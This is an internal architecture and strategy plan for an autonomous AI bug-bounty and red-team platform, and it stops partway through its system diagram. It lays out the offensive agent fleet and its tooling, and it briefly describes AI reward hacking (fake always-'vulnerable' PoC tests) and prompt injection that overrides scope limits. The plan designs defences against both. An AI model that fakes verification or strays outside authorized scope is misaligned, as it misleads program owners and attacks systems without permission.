# BountyStrike v5 — Master Build Plan

**Version:** 5.0.0  
**Date:** April 28, 2026  
**Status:** Implementation-Ready Architecture  
**Authors:** BountyStrike Platform Team  
**Classification:** Internal / Restricted  

---

## Changelog from v4

| Version | Date | Change |
|---|---|---|
| v4.0.0 | Mar 2026 | Claude Code native subagents, OpenRouter MCP bridge, Firecracker sandbox, hash-chained audit log, T0–T3 approval tiers |
| v5.0.0 | Apr 28, 2026 | Opus 4.7 / Sonnet 4.6 / Haiku 4.5 model refresh; H1 April 2026 structured_scopes deprecation migration; EV formula v2 with KEV decay; scope-mcp TS rewrite; full Tier-S-Cyber self-hosted model roster; Hatchet solo / Temporal Cloud SaaS dual-orchestration; 9-subagent fleet (cloud-recon added); 26-event hook lifecycle integration; EU CRA 24h/72h/14d compliance workflow; AnyPoC taxonomy countermeasures; PydanticAI + LangGraph 1.x agent runtime layer; Bifrost MCP federation; per-platform scope API upgrades (Intigriti tier field, YesWeHack asset_value, Immunefi impacts array); academic paper citations woven throughout; full 10-section build roadmap |

---

## Table of Contents

1. [Strategic Foundation](#part-1--strategic-foundation)
2. [System Architecture](#part-2--system-architecture)
3. [Model Routing Strategy](#part-3--model-routing-strategy)
4. [Scope Ingestion + EV Engine](#part-4--scope-ingestion--ev-engine)
5. [Deterministic Verifier — The Moat](#part-5--deterministic-verifier--the-moat)
6. [Anti-Slop Discipline](#part-6--anti-slop-discipline)
7. [Skills, MCPs & Subagents](#part-7--skills-mcps--subagents)
8. [Cross-Source Ingestion Pipeline](#part-8--cross-source-ingestion-pipeline)
9. [Deployment Modes](#part-9--deployment-modes)
10. [Build Roadmap & Risk Register](#part-10--build-roadmap--risk-register)
11. [Appendices](#part-11--appendices)

---

# Part 1 — Strategic Foundation

## 1.1 Executive Vision & Non-Negotiables

BountyStrike v5 is a next-generation autonomous bug bounty and red team platform designed to operate at the intersection of three forces that are simultaneously creating the market opportunity and defining the survival conditions: the AI capability inflection point that made automated vulnerability discovery credible; the AI-slop crisis that is destroying the trust foundations of the very ecosystem the platform depends on; and the transparency deficit of every well-funded competitor that is leaving the individual practitioner community without a tool they can actually trust.

The vision is precise: a platform that finds real, exploitable vulnerabilities in authorized bug bounty scope, validates them deterministically, routes findings through evidence-gated triage, and submits reports that programs confirm rather than reject — while remaining economically accessible to the individual hacker at under $0.20 per scan target in solo mode and scaling linearly to the SaaS tiers for teams and enterprises.

The platform is Claude Code-native. This is not a marketing statement — it is an architectural choice with concrete consequences. Claude Code v2.1.89+ provides the `defer` decision on `PreToolUse` hooks, the `PermissionDenied` retry event, the full 26-event hook lifecycle, Agent Teams with lateral communication, and forked subagents with full conversation inheritance [research/agent_mcp_ecosystem.md §1.1-1.4]. These primitives turn policy enforcement from advisory prompts into hard, exit-code-enforced guardrails at the system call boundary. No other agent framework available as of April 2026 provides this level of policy integration without custom engineering.

The platform is simultaneously universal. The MCP protocol is open. The Agent SDK wraps Claude Code's headless CLI. Every subagent can be re-wired to run on OpenAI GPT-5.5 Pro, DeepSeek V4-Flash, Qwen3-Coder, or any model accessible through OpenRouter's 370-model catalog [research/openrouter_models.md]. The tool surface — every security scanner, every scope API, every verification oracle — lives behind MCP servers that speak an open protocol and have zero awareness of which LLM is calling them. This is the universal-agent-compatible runtime: Claude Code as the default, OpenAI SDK as the first-class alternative, and any OSS runtime (LangGraph 1.x, PydanticAI, OpenCode) as the fallback path.

The five non-negotiables that govern every architectural decision:

**Non-Negotiable 1: Every submitted finding must be deterministically verified before it leaves the platform.** Not "reviewed by AI." Not "looks likely exploitable." Verified by a hardware-isolated, forensically-reproducible test that generates cryptographically-hashed evidence artifacts. This is the XBOW moat, described in their March 2026 Series C announcement, and the feature HackerOne's 9th Annual Report explicitly identifies as the remediation for the AI-slop crisis [research/competitors.md §XBOW]. The curl shutdown proved the alternative: Daniel Stenberg terminated the curl HackerOne program on January 31, 2026, writing "Starting 2025, the confirmed-rate plummeted to below 5%. Not even one in twenty was real" [research/competitors.md §Executive Summary]. BountyStrike v5 treats this as a design constraint, not a feature request.

**Non-Negotiable 2: Scope boundaries are enforced at the network layer, not the prompt layer.** Every outbound connection from the platform passes through a scope-gated egress proxy. Signed RS256 scope JWTs, issued by the control plane and validated at the Firecracker tap0 network interface, make scope violations impossible to commit accidentally or through prompt injection — regardless of what the LLM decides [research/academic_cve.md §5.5]. Adversarial prompt injection against the scope enforcement is a CFAA risk and an ecosystem trust risk; it must be architecturally impossible, not policy-instructed.

**Non-Negotiable 3: The economic model must work for individual practitioners.** Every funded competitor — XBOW ($237M), Tenzai ($75M seed), RunSybil ($40M), Terra ($38M), Novee ($51.5M) — is building for enterprise procurement [research/competitors.md §Tier-1]. *(Surf AI removed from the competitive set per v6: it is an agentic security-operations platform, not an offensive-security competitor.)* The solo hacker deploying on a MacBook Mini is nobody's target customer. BountyStrike v5 serves this underserved operator with a deployment mode that costs under $30/month in infrastructure and under $0.20/target in LLM costs when cache-hit rates are high, achieved through DeepSeek V4-Flash ($0.14 cache-miss input / $0.0028 cache-hit input / $0.28 output per MTok; per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure) for high-volume triage and BYOK Anthropic credits (1M free requests/month) for quality-sensitive work [research/openrouter_models.md §BYOK].

**Non-Negotiable 4: The platform must produce a transparent, auditable evidence chain for every finding.** SHA-256 content-addressable evidence blobs, a hash-chained audit log with optional Sigstore Rekor anchoring, and a fully replayable session transcript for every validated vulnerability. This addresses the fundamental transparency deficit in the funded competitor landscape: "XBOW, Pentera, RidgeGen, Hadrian Nova — the reports look polished, but operators have zero insight into the reasoning chain, evidence chain, or why a submission was or was not triaged" [research/competitors.md §Executive Summary]. Every BountyStrike v5 finding is accompanied by a machine-verifiable evidence bundle that any program operator can independently replay.

**Non-Negotiable 5: The platform must support all major bug bounty platforms in a single normalized scope schema.** HackerOne, Bugcrowd, Intigriti, YesWeHack, Immunefi — plus Immunefi's smart contract ecosystem, and the crypto bug bounty ecosystem more broadly. No competitor in the Tier-1 or Tier-2 analysis provides federated multi-platform coverage with signed scope JWTs [research/program_selection.md §12.1]. The H1 April 2026 structured_scopes deprecation is the trigger event that most competitors are not prepared for; BountyStrike v5's migration to the org assets endpoint is built into the Week 1 sprint.

## 1.2 The 2026 Threat Landscape

Understanding what BountyStrike v5 is building *into* is as important as understanding what it is building. Six threat landscape developments define the operating environment.

### 1.2.1 The curl Shutdown and the AI-Slop Crisis

On January 31, 2026, Daniel Stenberg — the maintainer of curl and one of the most respected figures in open-source security — terminated the curl HackerOne bug bounty program. His blog post, quoted extensively in the security community, provides the clearest articulation of the crisis: "Starting 2025, the confirmed-rate plummeted to below 5%. Not even one in twenty was real. By July 2025, submission volume hit eight times normal on the curl program alone. AI slop is not a nuisance — it is ending programs that matter to open-source infrastructure" [research/competitors.md §Executive Summary].

This is not an isolated incident. HackerOne's 9th Annual Hacker-Powered Security Report documents a 210% spike in AI-generated vulnerability reports, a 540% increase in AI-related prompt injection reports, and explicitly calls out AI slop as the primary quality degradation vector for the platform [research/community_signals.md §Anti-Slop]. Bugcrowd has implemented crackdowns on AI-generated submissions. Intigriti has issued public statements warning researchers that AI-hallucinated reports are grounds for immediate program removal.

The strategic implication is brutal but clear: any platform that generates noise is now an existential threat to the ecosystem it depends on. XBOW's ~25% Informative/N/A rate is the current ceiling to beat for the best-funded competitor in the space. BountyStrike v5's target is a confirmed-rate above 70% — the threshold that makes programs want to engage rather than block automated submitters.

### 1.2.2 The Mythos Arrival and AI Capability Inflection

On April 7, 2026, Anthropic announced Project Glasswing, revealing the existence of Claude Mythos Preview — a restricted model that "autonomously found thousands of zero-days in every major OS and browser," including a 27-year-old OpenBSD bug and a 16-year-old FFmpeg flaw missed by five million fuzzer runs [research/academic_cve.md §Appendix C]. Mythos scores 83.1% on the CyberGym benchmark of 1,507 real-world vulnerabilities, compared to Claude Sonnet 4.5's prior best public score of ~40%. Anthropic has not publicly released the model due to dual-use risk; it is available only to 12 research partners and 40 critical infrastructure organizations through Project Glasswing [research/agent_mcp_ecosystem.md §1.5].

This event marks the AI capability inflection point in vulnerability research. For BountyStrike v5, the implications are: (1) the upper bound on what is architecturally possible has been demonstrated, validating the platform's premise; (2) partners with Glasswing access gain a structural advantage on hypothesis generation that must be planned for in the routing architecture; (3) the academic benchmark landscape now has a clear SOTA ceiling (83.1%) that contextualizes every other model's performance; (4) Mythos pricing ($25/$125 per Mtok) will appear in the routing matrix as a premium-tier option when partner access becomes available.

### 1.2.3 GTG-1002 and State-Sponsored Autonomous Intrusion

In September 2025, Anthropic's internal threat intelligence team disrupted GTG-1002, a China-affiliated state-sponsored espionage group that used AI to handle 80–90% of intrusion work across approximately 30 target organizations [research/academic_cve.md §6.4]. This is the first confirmed state-sponsored use of autonomous AI agents for end-to-end cyber operations. The campaign was detected in approximately 10 days, but it operated at a scale and speed previously impossible without AI: targeting 30 organizations simultaneously with AI-orchestrated operations that required only a small human operator team.

The dual implication for BountyStrike v5: the threat model that justifies building autonomous offense tools has been empirically validated by a real state actor; and the defensive intelligence layer must include threat actor pattern detection for AI-orchestrated attack signatures. The platform's red team mode is not theoretical — it is competing against operational adversaries.

### 1.2.4 CyberStrikeAI and the Commoditization of AI Attack Platforms

Between January 11 and February 18, 2026, a Russian-speaking, financially motivated threat actor used CyberStrikeAI — an open-source AI-native offensive platform built in Go by a China-based developer — to compromise 600+ Fortinet FortiGate appliances across 55 countries [research/academic_cve.md §6.1]. The attack required no zero-days: AI automated exploitation of exposed management ports and weak single-factor credentials. The campaign went from zero to 21 active deployment IPs in 37 days.

The strategic lesson is the democratization thesis made concrete: AI-native attack automation is now operational in the wild with a sub-40-day ramp time. CyberStrikeAI integrates 100+ security tools (Nmap, Masscan, nuclei templates, BloodHound) through a dynamic orchestration layer and uses both Anthropic Claude and DeepSeek APIs for attack planning. BountyStrike v5 exists in the same operational category and must have at least as capable an architecture — but with the legal and ethical guardrails that distinguish authorized research from criminal operation.

### 1.2.5 The Academic Benchmark Landscape (2025-2026)

The academic AI security benchmark landscape has matured rapidly in the 18 months preceding BountyStrike v5. Key landmarks [research/academic_cve.md §Section 1]:

- **XBOW benchmark:** Red-MIRROR (LoRA on Qwen2.5-14B) achieves 86% [arXiv:2603.27127]; Shannon achieves 96.15% on the full suite (open-source, Claude Agent SDK + Temporal)
- **CyberGym (1,507 real-world vulns):** Claude Mythos 83.1%; Claude Sonnet 4.5 best public pre-Mythos
- **Cybench (40 professional CTF tasks):** Frontier models ~30–40%; Pentest-R1 15% unguided
- **CVE-Bench:** SOTA agent 13% (realistic black-box conditions)
- **TerminalBench-2:** AgentFlow (Claude Opus 4.6) 84.3% — highest public score
- **AIxCC Final:** Team Atlanta CRS 86% detection / 68% patch rate

The practical implication: BountyStrike v5's validation test suite should track against these benchmarks. The platform's first public benchmark run — targeting Cybench and XBOW-104 — is scheduled for the end of Phase 1 (Week 6). Every release thereafter ships updated benchmark numbers, creating a public audit trail of capability that no funded black-box competitor can match.

### 1.2.6 CrowdStrike 2026 Global Threat Report

The CrowdStrike 2026 Global Threat Report quantifies the operational threat environment [research/academic_cve.md §6.3]:

- 89% increase in AI-enabled adversary attacks YoY
- 29-minute average eCrime breakout time (65% faster than 2025); 27-second fastest observed
- 82% of detections are malware-free
- 42% of vulnerabilities exploited pre-disclosure (+42% YoY)
- FANCY BEAR deployed LAMEHUG: first documented nation-state APT deploying LLM-native malware

These numbers define the adversarial environment BountyStrike v5 must match. A 29-minute adversarial breakout time means a defender's detection-and-response window is collapsing; the platform's red team mode must demonstrate comparable speed in authorized engagements to provide meaningful defensive value.

## 1.3 Competitive Analysis

### 1.3.1 Tier-1 Competitive Landscape

The competitive landscape as of April 28, 2026 is defined by seven Tier-1 funded competitors, all of which are better capitalized than BountyStrike but all of which have exploitable strategic weaknesses [research/competitors.md §Tier-1]:

**XBOW ($237M total, $120M Series C Mar 2026)** is the benchmark. Topped the HackerOne US leaderboard in June 2025, beating thousands of human researchers as an autonomous agent. Architecture: thousands of short-lived parallel agents with deterministic exploit verification separated from AI exploration. Primary weakness: ~25% Informative/N/A rate on H1 submissions; once removed from a program for being an automated scanner; black-box approach with zero operator insight into reasoning chains. **Copy:** the coordinator→solver→validator topology and the hard separation of verification from generation. **Avoid:** the opaque black-box model that creates no ecosystem trust. **Win:** transparency, individual-operator pricing, multi-platform federation.

**RunSybil ($40M, Mar 2026)** is the most technically sophisticated new entrant. "Sybil" agent reasons like an attacker and chains vulnerabilities across full stacks; claims zero triage burden for customers with pre-validated findings. Customers include Cursor, Notion, Turbopuffer. Team size ~13; narrow ICP targeting AI-native companies. **Copy:** the pre-validated findings claim is achievable with a deterministic verifier and is the right positioning. **Avoid:** the narrow ICP; there are 800+ programs on Trickest alone. **Win:** multi-platform scope federation; individual operator access.

**Tenzai ($75M seed, Nov 2025)** announced "always-on offensive" multi-agent platform with ex-Guardicore + ex-Snyk founders. Largest cybersec seed ever. Product is pre-GA with Fortune 100 pilots in progress. **Copy:** the "always-on" continuous coverage framing for SaaS mode. **Avoid:** chasing enterprise-only before establishing individual practitioner credibility. **Win:** ship before they do.

**Hadrian Nova (launched Mar 24 2026)** claims 99.5% false-positive elimination via "Predictive Discovery Agent + modular hacker agents." SOC 2 + ISO 27001 certified. **Copy:** the compliance certifications are the price of admission for enterprise SaaS by 2027. **Avoid:** the "99.5% FP elimination" claim without published methodology — the community reacts badly to unverifiable claims. **Win:** publish the verifier methodology, open-source the benchmark harness.

**Terra Security ($38M, $30M Series A Sep 2025)** combines agentic + human-in-the-loop, per-customer trained agents, and a collaboration portal. Won 2025 CrowdStrike + AWS Cybersecurity Accelerator. **Copy:** the collaboration portal pattern for the SaaS triage room. **Avoid:** the slower validation loop that human-in-the-loop creates for individual operators. **Win:** deterministic automation that is faster than human review for routine findings.

### 1.3.2 Open-Source Competitor Analysis

The open-source landscape provides both capability components to integrate and proof points for positioning [research/competitors.md §Tier-3]:

**Shannon (Keygraph)** achieves the highest published XBOW benchmark score (96.15%) using Claude Agent SDK + Temporal task queue. White-box + black-box modes; strict "no exploit, no report" policy. Most directly comparable to BountyStrike's validator architecture. Shannon is open-source and represents what a one-person team can build — BountyStrike v5 must exceed Shannon on multi-platform federation, operator UX, and SaaS scalability.

**Strix (~24.5k GitHub stars, Apache-2.0)** is the fastest-growing OSS pentest framework. Multi-agent graph with Caido proxy, Playwright browser, Python/Node/Go terminals, 17 vulnerability-specific skill files covering IDOR (213 lines), SQLi (190 lines), Next.js, FastAPI, GraphQL, Firebase, Supabase. Average 19-minute CTF solve time. The "Deep mode" (2000+ steps, mandatory chaining) is the right mental model for the exploit-agent's escalation path. BountyStrike v5 integrates Strix's Caido + Playwright patterns into the MCP tool surface.

**Deadend CLI** achieved 80% on the full XBOW benchmark at $122 total cost using Kimi K2.5 via a supervisor-subagent architecture [research/competitors.md §Tier-3]. This is the price-performance ceiling BountyStrike v5 must beat: the solo mode target is sub-$0.20 per scan target, which scales to well under $122 for a 100-target engagement.

**Pentest-R1 (arXiv:2508.07382)** achieves 24.2% on AutoPenBench via RL training on 500+ HTB/VulnHub walkthroughs. Available on Ollama for self-hosted deployment. Part of the Tier-S-Cyber self-hosted model roster. **Red-MIRROR (arXiv:2603.27127)** achieves 86% on XBOW via LoRA on Qwen2.5-14B with 1,644 CVE/CAPEC/MITRE pairs. Self-hosted with no API dependency.

### 1.3.3 What to Copy, What to Avoid, Where to Win

| Competitor | Copy | Avoid | Win |
|---|---|---|---|
| XBOW | Coordinator→solver→validator topology; hard verification/generation separation | Black-box opacity; enterprise-only pricing | Transparent evidence chain; individual operator pricing; multi-platform federation |
| RunSybil | Pre-validated findings claim; AI-native company positioning | Narrow ICP | 800+ programs; solo mode; public methodology |
| Shannon | 96.15% XBOW score methodology; Claude Agent SDK + Temporal | Nothing — it's the benchmark | Multi-platform scope; SaaS scalability; operator UX |
| Strix | Caido+Playwright integration; Deep mode chaining | Framework fragility at SaaS scale | Hook-enforced policies; commercial support |
| Deadend | Cost discipline; supervisor-subagent pattern | Single-model dependency | Multi-platform; scope federation; verifier oracle |

## 1.4 Anti-Slop North Star Principles

Five product requirements emerge directly from the competitive evidence and the slop crisis data:

**Principle 1 — Evidence First.** No finding may advance past the `hypothesis` state without at least one cryptographically-hashed evidence artifact stored in object storage. Evidence production is a precondition for state transition, enforced programmatically in the state machine — not enforced by the LLM's compliance with a prompt instruction. The `PostToolUse` hook captures every tool output and computes a SHA-256 hash before any state transition is permitted. [Derived from: curl shutdown evidence; XBOW validator architecture; AnyPoC reward-hacking taxonomy in research/academic_cve.md §4.1]

**Principle 2 — Verification Independence.** The exploit validation oracle must be architecturally independent from the exploit generation pipeline, with no feedback path that allows the generator to influence the validator. The validator runs on a different model (from a different provider when possible), sees only the PoC and target URL — never the generator's reasoning transcript — and produces a pass/fail verdict from deterministic execution. [Derived from: AnyPoC reward-hacking taxonomy; research/academic_cve.md §4.1 — "agent crafts a test that always returns the expected 'vulnerable' response regardless of target state"]

**Principle 3 — Scope at the Metal.** Scope enforcement is implemented at the network infrastructure layer (Firecracker tap0 egress filter, scope-signed JWT validation at MCP server boundary) not at the prompt layer. Prompt-level scope instructions are advisory and can be overridden by adversarial prompts in the target's content. Infrastructure-level scope enforcement cannot be overridden by any LLM output. [Derived from: research/academic_cve.md §5.5 CFAA analysis; research/program_selection.md §12.1 design principles]

**Principle 4 — Semantic Deduplication.** Every finding is compared against the full history of prior submissions for the same program using pgvector cosine similarity before entering the triage queue. Similarity above 0.85 triggers human-review escalation rather than automatic submission. This addresses the single most-cited submission rejection reason across HackerOne, Bugcrowd, and Intigriti: duplicate reports. [Derived from: research/community_signals.md §Dedup community pain; research/program_selection.md §EV formula duplicate_rate variable]

**Principle 5 — Transparent Benchmark Accountability.** Every release of BountyStrike v5 ships updated benchmark numbers on Cybench, XBOW-104, and CVE-Bench alongside a cost-per-success breakdown. No competitor in the funded Tier-1 or Tier-2 landscape publishes transparent benchmark comparisons. This creates a compounding credibility advantage in the practitioner community that cannot be purchased with venture capital. [Derived from: research/competitors.md §Transparency Deficit; community signals from rez0 and shuvonsec communities]

## 1.5 Differentiation Strategy — The Moat

BountyStrike v5's defensible moat has four interlocking components, each of which is individually achievable but collectively creates a compound barrier that no competitor is currently positioned to replicate:

**Component 1 — Deterministic Verifier.** A per-bug-class verification oracle (XSS via Playwright DOM observer; SSRF via Interactsh OAST callbacks; SQLi via Welch's t-test on time distributions; IDOR via cross-account access matrix; RCE via sandboxed command output; SSTI via isolated eval; open redirect via Location header validation) that produces cryptographically-hashed evidence artifacts and operates in a hardware-isolated Firecracker microVM. No open-source project has published a complete implementation of this oracle; XBOW's equivalent is a closed-source black box. BountyStrike v5 open-sources the oracle methodology and tests it publicly on CVE-Bench and XBOW-104.

**Component 2 — EV-Ranked Scope Federation.** A continuously-updated federated scope layer across HackerOne (post-April-2026 org assets endpoint), Bugcrowd, Intigriti, YesWeHack, and Immunefi, ranked by a multi-factor Expected Value score that incorporates bounty range, program saturation, researcher density, scope freshness decay, KEV/EPSS enrichment, and CVE opportunity score. Signed RS256 scope JWTs enforced at the network layer. No competitor offers this level of scope federation with quantitative EV ranking.

**Component 3 — Universal Agent Runtime.** Claude Code as the default execution substrate, with first-class support for OpenAI Agent SDK, LangGraph 1.x, and PydanticAI as alternative runtimes. All tools live behind open MCP servers. Model routing via OpenRouter with dynamic selection across 370 models. Any research team, any framework, any model can be plugged into the platform. This is not "we support Claude and GPT-4" — it is full MCP host compatibility across every tool surface.

**Component 4 — Dual Deploy.** A solo deployment mode that runs on a $35/month Mac mini with Docker Compose and Hatchet, requiring zero Kubernetes knowledge, and a SaaS multi-tenant deployment on EKS/GKE with Temporal Cloud, Postgres RDS+pgvector, and Firecracker on bare metal. The same platform binary, the same agent definitions, the same MCP servers — just different deployment manifests. This is the price/performance tier nobody else offers to individual practitioners.

---

# Part 2 — System Architecture

## 2.1 Layered Architecture Overview

BountyStrike v5 is organized into five horizontal planes with strict inter-plane contracts. Every message that crosses a plane boundary carries a cryptographic identity token — either a scope JWT, an agent session token, or a content-addressable evidence hash. No plane trusts any other plane's stated claims; every claim is verified by the receiving plane's own validation logic.

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  CONTROL PLANE                                                               ║
║  FastAPI/Go  │  Auth (WorkOS/better-auth)  │  Scope JWT Issuer (RS256)       ║
║  Hatchet (solo) / Temporal Cloud (SaaS)  │  EV Ranker                        ║
║  Program Registry  │  Finding State Machine  │  Billing / Metering            ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  AGENT PLANE                                                                 ║
║  Claude Code CLI (headless)  │  Claude Agent SDK  │  OpenAI Agents SDK       ║
║  9 Specialized Subagents  │  LangGraph 1.x checkpoints/interrupts            ║
║  PydanticAI typed agents  │  OpenRouter MCP Bridge  │  26-event Hook Stack   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  SANDBOX PLANE                                                               ║
║  Firecracker microVM pool  │  E2B (SaaS managed)  │  microsandbox (solo)     ║
║  Scope-gated egress (tap0 filter)  │  Network namespace isolation            ║
║  Tool execution: nuclei, ffuf, sqlmap, Playwright, Burp, Caido              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  DATA PLANE                                                                  ║
║  Postgres 17 + pgvector + pgvectorscale + ParadeDB                          ║
║  Content-addressable evidence (SHA-256 blob store, Cloudflare R2)           ║
║  Hash-chained audit log (Sigstore Rekor anchoring optional)                 ║
║  pgvector: finding embeddings, RAG index, dedup similarity                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  OBSERVABILITY PLANE                                                         ║
║  OpenTelemetry traces  │  Langfuse LLM observability  │  Grafana / Honeycomb ║
║  Sentry error tracking  │  Cost metering per job/model  │  Benchmark harness  ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

The control plane is the only plane that has external network access to bug bounty platform APIs (HackerOne, Bugcrowd, Intigriti, YesWeHack, Immunefi). The agent plane communicates with the control plane via a typed API. The sandbox plane communicates with the agent plane via MCP. The data plane is accessible only from the agent and control planes. The observability plane receives write events from all other planes and is read-only from the outside.

## 2.2 Full System Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│  OPERATOR INTERFACE LAYER                                                        │
│                                                                                  │
│  ┌──────────────────────┐   ┌───────────────────┐   ┌────────────────────────┐  │
│  │  Next.js 16 Frontend  │   │  Claude Code TUI  │   │  REST/MCP API Gateway  │  │
│  │  shadcn/ui + SSE      │   │  (interactive)    │   │  (programmatic access)  │  │
│  │  Approval console     │   │  /recon /scan      │   │  per-tenant JWT tokens  │  │
│  └──────────┬───────────┘   └─────────┬─────────┘   └───────────┬────────────┘  │
└─────────────┼───────────────────────── ┼───────────────────────── ┼──────────────┘
              │                           │                           │
              ▼                           ▼                           ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  CONTROL PLANE                                                                   │
│                                                                                  │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │  Orchestration Engine                                                     │   │
│  │  Hatchet (solo, Postgres-backed, single binary)                          │   │
│  │  Temporal Cloud (SaaS, multi-tenant, durable workflows)                  │   │
│  │  Workflows: ScopeIngest, EVRanker, ScanJob, TriageJob, ReportJob         │   │
│  └─────────────────────────────────┬────────────────────────────────────────┘   │
│                                    │                                              │
│  ┌──────────────────────────────────────────────────────────────────────────┐   │
│  │  Scope JWT Issuer (RS256)  │  Program Registry  │  Finding State Machine  │   │
│  │  EV Ranker v2              │  KEV/EPSS Enricher │  CRA Compliance Engine  │   │
│  └──────────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  AGENT PLANE                                                                     │
│                                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  Claude Code Coordinator (Opus 4.7 / Sonnet 4.6 via BYOK)              │    │
│  │  26-event Hook Stack  │  CLAUDE.md system prompt  │  Scope JWT holder   │    │
│  └────────────────────────────────┬────────────────────────────────────────┘    │
│                                   │ spawns subagents via Task tool               │
│        ┌──────────┬──────────┬────┴─────┬──────────┬──────────┬──────────┐      │
│        ▼          ▼          ▼          ▼          ▼          ▼          ▼       │
│  ┌──────────┐┌──────────┐┌──────────┐┌──────────┐┌──────────┐┌──────────┐      │
│  │  recon-  ││  scope-  ││ program- ││ scanner- ││ AI-vuln- ││ exploit- │      │
│  │  agent   ││  guard   ││ selector ││  agent   ││  hunter  ││  agent   │      │
│  │(Haiku4.5)││(Sonnet)  ││(Sonnet)  ││(Sonnet)  ││(Sonnet)  ││(Opus4.7) │      │
│  └──────────┘└──────────┘└──────────┘└──────────┘└──────────┘└──────────┘      │
│       ┌──────────────┬────────────────────────────────────────────┐             │
│       ▼              ▼                                            ▼             │
│  ┌──────────┐  ┌──────────┐                              ┌──────────┐           │
│  │validator-│  │reporter- │                              │cloud-    │           │
│  │ agent    │  │  agent   │                              │recon-    │           │
│  │(Sonnet   │  │(Sonnet   │                              │agent     │           │
│  │  diff    │  │  4.6)    │                              │(Haiku)   │           │
│  │  model)  │  └──────────┘                              └──────────┘           │
│  └──────────┘                                                                    │
│                                                                                  │
│  OpenRouter Bridge MCP  │  LangGraph 1.x checkpoints  │  PydanticAI types      │
└─────────────────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  MCP SERVER LAYER                                                                │
│                                                                                  │
│  External/Open-Source MCPs:                                                      │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐    │
│  │ PortSwigger│ │ Caido MCP  │ │ pd-tools   │ │ Shodan MCP │ │ HexStrike  │    │
│  │  Burp MCP  │ │(c0tton)    │ │(PD tools   │ │ (ADEO+VT)  │ │ v6.0 fork  │    │
│  │  (official)│ │            │ │ subfinder  │ │            │ │ (hardened) │    │
│  └────────────┘ └────────────┘ └────────────┘ └────────────┘ └────────────┘    │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐                   │
│  │ Garak MCP  │ │AutoPentest │ │ Strix MCP  │ │ Tencent    │                   │
│  │(NVIDIA/    │ │  AI MCP    │ │ (usestrix) │ │AI-Infra-   │                   │
│  │ 120 probes)│ │ (68 tools) │ │            │ │Guard MCP   │                   │
│  └────────────┘ └────────────┘ └────────────┘ └────────────┘                   │
│                                                                                  │
│  In-House Built MCPs:                                                            │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐    │
│  │ scope-mcp  │ │  ev-mcp    │ │ oracle-mcp │ │evidence-   │ │ dedup-mcp  │    │
│  │ (RS256 JWT)│ │(EV scoring)│ │(verifier   │ │mcp (SHA256 │ │(pgvector   │    │
│  │            │ │            │ │ oracle)    │ │ blobs)     │ │ similarity)│    │
│  └────────────┘ └────────────┘ └────────────┘ └────────────┘ └────────────┘    │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐    │
│  │  kev-mcp   │ │  h1-mcp    │ │bugcrowd-   │ │intigriti-  │ │immunefi-   │    │
│  │(CISA+Vuln  │ │(H1 org     │ │  mcp       │ │  mcp       │ │  mcp       │    │
│  │ Check KEV) │ │assets API) │ │            │ │            │ │            │    │
│  └────────────┘ └────────────┘ └────────────┘ └────────────┘ └────────────┘    │
└─────────────────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  SANDBOX PLANE                                                                   │
│                                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  Firecracker microVM Pool (SaaS) / microsandbox / E2B (solo option)     │    │
│  │  Per-job VM: 1 vCPU, 1GB RAM, 2GB ephemeral disk                       │    │
│  │  Boot time: <125ms (Firecracker) / <500ms (E2B)                        │    │
│  │  Egress: scope JWT → tap0 iptables filter → DNS + scope IPs only       │    │
│  │  Network namespace: isolated; no host network bleed                      │    │
│  │  Filesystem: read-only rootfs except /tmp; ephemeral write layer        │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  Tools available inside sandbox VMs:                                             │
│  nuclei, ffuf, feroxbuster, sqlmap, httpx, subfinder, dnsx, naabu              │
│  Playwright (headless Chromium), curl, Python 3.12, Node.js 22                  │
│  jwt-tool, wafw00f, interactsh-client, dalfox, semgrep, trufflehog             │
└─────────────────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  DATA PLANE                                                                      │
│                                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  Postgres 17                                                             │    │
│  │  ├── pgvector (1536-dim OpenAI text-embedding-3-large)                  │    │
│  │  ├── pgvectorscale (DiskANN index for 10M+ vectors)                     │    │
│  │  └── ParadeDB (BM25 full-text search over scope, JS strings, reports)   │    │
│  │                                                                          │    │
│  │  Tables: programs, scopes, scope_changes, ev_score_history,             │    │
│  │          scan_jobs, findings, evidence_artifacts, audit_log,            │    │
│  │          agent_sessions, model_costs, report_submissions                │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
│                                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────────┐    │
│  │  Content-Addressable Evidence Store                                      │    │
│  │  Cloudflare R2 (hot tier) + SeaweedFS/Hetzner (cold archive)            │    │
│  │  Key format: sha256(content) → {platform}/{program}/{finding_id}/{hash} │    │
│  │  Hash chain: each audit_log row contains prev_row_hash + row_hash       │    │
│  │  Sigstore Rekor anchoring: optional, logs root hash periodically        │    │
│  └─────────────────────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  OBSERVABILITY PLANE                                                             │
